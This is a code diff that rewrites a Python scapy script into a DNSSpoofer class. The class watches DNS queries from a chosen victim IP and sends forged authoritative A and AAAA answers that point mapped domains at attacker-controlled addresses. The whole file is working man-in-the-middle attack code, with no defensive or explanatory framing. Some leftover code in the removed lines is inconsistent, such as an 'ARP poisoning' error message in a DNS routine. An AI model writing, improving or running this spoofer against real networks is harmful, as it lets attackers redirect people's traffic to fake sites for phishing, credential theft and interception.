@@ -1,57 +1,95 @@
-import scapy.all as sc;
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
+from scapy.layers.inet6 import IPv6
 
-def dns_spoofing(domain, spoof_ip):
-    iface = ""
 
-    try:
-        # Sniff for DNS packet
-        pkt = sc.sniff(
-            filter="ip",
-            iface=iface,
-            store=1,
-            stop_filter=lambda p: (
-                p.haslayer(sc.IP)
-                and p.haslayer(sc.UDP)
-                and p[sc.UDP].dport == 53
-        ))[0]
+class DNSSpoofer:
+    def __init__(self, interface, victim_ip, dns_mapping, attacker_ip, attacker_ipv6, logger):
+        self.interface = interface
+        self.victim_ip = victim_ip
+        self.attacker_ip = attacker_ip
+        self.attacker_ipv6 = attacker_ipv6
+        self.dns_mapping = dns_mapping  # { "example.com": "1.2.3.4" }
+        self.logger = logger
+        self.running = False
 
-        handle_dns_query(pkt, domain, spoof_ip)
+    def start(self):
+        self.running = True
 
-    except Exception as e:
-        print(f"[!] Error during ARP poisoning: {e}")
+    def stop(self):
+        self.running = False
+
+    def _get_src_ip(self, packet):
+        if packet.haslayer(IP):
+            return packet[IP].src, IP
+        if packet.haslayer(IPv6):
+            return packet[IPv6].src, IPv6
         return None, None
-    
 
-def modify_packet(packet, spoof_ip):
-    qname = packet[sc.DNSQR].qname
-    packet[sc.DNS].an = sc.DNSRR(rrname=qname, rdata=spoof_ip)
-    packet[sc.DNS].ancount = 1
+    def _dns_filter(self, packet):
+        try:
+            # Basic DNS query validation
+            if not (
+                packet.haslayer(DNS) and
+                packet[DNS].qr == 0 and
+                packet.haslayer(UDP) and
+                packet[UDP].dport == 53 and
+                packet.haslayer(DNSQR)
+            ):
+                return False
 
-    del packet[sc.IP].len
-    del packet[sc.IP].chksum
-    del packet[sc.UDP].len
-    del packet[sc.UDP].chksum
+            src_ip, ip_layer = self._get_src_ip(packet)
+            if src_ip != self.victim_ip:
+                return False
 
-    return packet
+            qname = packet[DNSQR].qname
+            domain = (
+                qname.decode("utf-8", errors="ignore").rstrip(".")
+                if isinstance(qname, bytes)
+                else str(qname).rstrip(".")
+            )
 
-def handle_dns_query(pkt, domain, spoof_ip):
-    # Ensure it's a DNS packet
-    if pkt.haslayer(sc.DNS) and pkt.haslayer(sc.DNSQR):
+            qtype = packet[DNSQR].qtype
+            spoof_ip = self.dns_mapping.get(domain)
 
-        # Extract metadata
-        query_domain = pkt[sc.DNSQR].qname.decode() if hasattr(pkt[sc.DNSQR].qname, "decode") else pkt[sc.DNSQR].qname
-        query_type = pkt[sc.DNSQR].qtype
-        tx_id = pkt[sc.DNS].id
-        src_ip = pkt[sc.IP].src
+            if not spoof_ip:
+                return False
 
-        print("\n=== DNS Query Detected ===")
-        print(f"Victim IP:        {src_ip}")
-        print(f"Requested Domain: {query_domain}")
-        print(f"Query Type:       {query_type}")
-        print(f"Transaction ID:   {tx_id}")
+            # Determine record type
+            if qtype == 1:  # A record
+                rdata = spoof_ip
+                rr_type = "A"
+            elif qtype == 28 and self.attacker_ipv6:  # AAAA record
+                rdata = self.attacker_ipv6
+                rr_type = "AAAA"
+            else:
+                return False
 
-        if domain.encode() in query_domain.lower().encode():
-            print(f"[!] Domain MATCH: Victim requested {query_domain}")
-            modified_packet = modify_packet(pkt, spoof_ip)
-            pkt.set_payload(bytes(modified_packet))
-            pkt.accept()
+            # Build response
+            ip_response = ip_layer(
+                dst=packet[ip_layer].src,
+                src=packet[ip_layer].dst
+            )
+
+            dns_reply = (
+                ip_response /
+                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
+                DNS(
+                    id=packet[DNS].id,
+                    qr=1,
+                    aa=1,
+                    qd=packet[DNS].qd,
+                    an=DNSRR(
+                        rrname=packet[DNSQR].qname,
+                        type=rr_type,
+                        ttl=300,
+                        rdata=rdata
+                    )
+                )
+            )
+
+            send(dns_reply, iface=self.interface, verbose=0)
+            return True
+
+        except Exception as e:
+            self.logger(f"DNS filter error: {e}")
+            return False
